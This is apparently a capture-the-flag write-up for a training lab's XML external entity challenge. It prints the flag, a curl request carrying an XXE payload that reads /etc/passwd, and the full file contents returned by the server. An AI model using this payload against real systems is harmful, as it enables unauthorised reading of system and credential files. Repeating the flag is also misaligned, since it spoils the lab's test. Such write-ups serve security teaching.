# DESCRIPCIÓN:
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://chatelaine.cylabacademy.net:12328/)
XML external entity Injection

# SOLUCIÓN:
#### academy{XML_3xtern@l_3nt1t1ty_6249c1d4}

```
┌──(mony㉿Mony)-[~]
└─$ curl -X POST http://chatelaine.cylabacademy.net:13433/data -H "Content-Type: application/xml" -d '<?xml version="1.0
" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>'
Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
flask:x:999:999::/app:/bin/sh
academy:x:1001:academy{XML_3xtern@l_3nt1t1ty_6249c1d4}
```

# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/